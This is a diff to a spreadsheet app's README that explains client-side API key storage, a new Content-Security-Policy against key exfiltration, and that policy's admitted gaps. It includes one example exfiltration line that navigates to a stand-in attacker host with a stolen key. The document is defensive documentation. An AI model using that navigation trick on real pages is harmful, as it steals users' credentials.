@@ -249,7 +249,7 @@ Other available commands:
 | `npm test` | Run the 948-case Vitest suite |
 | `npm run check:readme` | Check the READMEs still match the code (links/images/test count/new modules/both languages) |
 | `npm run check:a11y` | axe on both pages at 390px and 1280px, plus sideways-scroll checks (needs a build) |
-| `npm run check:e2e` | Drives the real app through 7 flows: formulas, `.xlsx` round trip, keyboard only, undo, announcements, the AI assistant (needs a build) |
+| `npm run check:e2e` | Drives the real app through 8 flows: formulas, `.xlsx` round trip, keyboard only, undo, announcements, the AI assistant, the CSP (needs a build) |
 | `npm run check:ai` | Asks the real Claude with your own key and checks the formulas against what this engine can evaluate — not in `verify`, because it needs a key and costs money |
 | `npm run verify` | Everything, before a push: lint → check:readme → test → build → check:a11y → check:e2e |
 | `npm run build:social` | Re-render `public/social-preview.png` (1280×640), counting the card's figures from source |
@@ -1865,6 +1865,53 @@ ever reaches the fetcher
 **Confirmed by reverting** — all four cases fail on the old code and pass on the new. The tests were not
 written to agree with whatever the code already did.
 
+### "Why is the API key on the client?" — the objection, answered
+
+A reader looked at the code and raised this, which is the right thing to ask. But two things look
+alike here and are not the same:
+
+| | Whose key | Who pays if it leaks |
+|---|---|---|
+| What people usually mean | The **operator's** key, shipped in the bundle (`NEXT_PUBLIC_...`) | The operator, for everyone on the internet |
+| What this app does | The **visitor's own** key, typed into their own tab | Themselves, by their own choice |
+
+No key of anyone's is embedded in this code. And **the intuitively "safer" option — posting the key
+to our server — is worse for the person who owns it**: their secret would then sit in the memory of
+a process they do not control, and possibly in the host's logs. There is nothing to leak here
+because there is nothing here.
+
+**The objection is right about one thing, and this is it:** a key in `sessionStorage` can be read by
+anything running in this page. The realistic path is a supply-chain attack on one npm dependency,
+not someone breaking into the host.
+
+So there is now a **Content-Security-Policy** (`next.config.ts`) aimed at the step *after* the theft
+— getting the key out. `connect-src` names the only three places this app ever talks to, so an
+injected script cannot `fetch` a stolen key to an attacker's server, and `form-action` closes the
+form route.
+
+**What it does not do, written here rather than left to be discovered:**
+
+- `script-src` still carries `'unsafe-inline'`. Next.js hydrates through inline scripts, and the
+  real fix — a per-request nonce from middleware — makes every page dynamic and throws away the
+  static rendering this app's speed rests on. **This is not a fix for XSS**, and pretending it were
+  would be worse than having no policy at all.
+- CSP cannot stop a top-level navigation (`location = "https://evil.example/?k=" + key`). The
+  `navigate-to` directive was dropped from the spec.
+
+**Measured, not asserted.** A `fetch` from inside the page to an origin outside the policy is
+refused — `Refused to connect … violates the following Content Security Policy directive` — while
+`api.anthropic.com` raises no violation. And the app runs under the policy without tripping over it
+once: charts draw, CSV and PDF downloads work.
+
+All of that is a flow in `check:e2e` now — the header itself, the blocked exfiltration attempt, and
+the app staying clean under its own policy — **proved by removing the header and watching the gate
+fail**. A header is exactly the kind of thing that stays in the config long after it stopped being
+served.
+
+The key box says both halves out loud too: kept in this tab only, never through our server, and
+**use a key you can revoke rather than your main one**, because a key held in a web page can be read
+by anything running in that page.
+
 ### 123 security tests
 
 | File | Tests | What it covers |
@@ -2027,7 +2074,7 @@ assistant sent a range including its text header, because the context builder re
 instead of computed values (both tested) · one new button pushed the language toggle 42px off the screen.
 
 ```bash
-npm run check:e2e   # 7 flows in a real browser (needs a build)
+npm run check:e2e   # 8 flows in a real browser (needs a build)
 ```
 
 Flows are picked by one rule: **would a unit test already catch it?** If yes it does not belong there. What
@@ -2204,8 +2251,16 @@ What's not done yet, and why — to show this is a known gap, not something forg
       hand-written generator and shrinker and a replayable seed. It found two real gaps on its first run
       (`TRUE()` failing to parse, `SUM` counting logical values sitting in cells), both now fixed. Still
       open: no property covers the `.xlsx` round trip, and the cross-sheet resolver is not generated against.
+- [x] **A Content-Security-Policy and the rest of the security headers** — done (`next.config.ts`):
+      `connect-src` names only `api.anthropic.com` and the Supabase origin when one is configured, so an
+      injected script cannot send the visitor's API key anywhere, alongside `frame-ancestors`,
+      `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `nosniff` and `Permissions-Policy`.
+      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **Still open:
+      `script-src` keeps `'unsafe-inline'`**, because Next.js hydrates through inline scripts and a
+      per-request nonce needs middleware, which makes every page dynamic. This closes the exit; it does
+      not stop XSS.
 - [x] **Tests that actually open the app (E2E) in CI** — done: `npm run check:e2e` drives Chromium
-      through 7 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
+      through 8 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
       the real buttons, keyboard-only navigation, undo, and whether anything is announced. Three bugs this
       project previously found by hand are now inside the gate's reach, and each gate was proved by breaking
       it. **The AI assistant is now covered too**, with `/api/ai/formula` stubbed: the range the panel
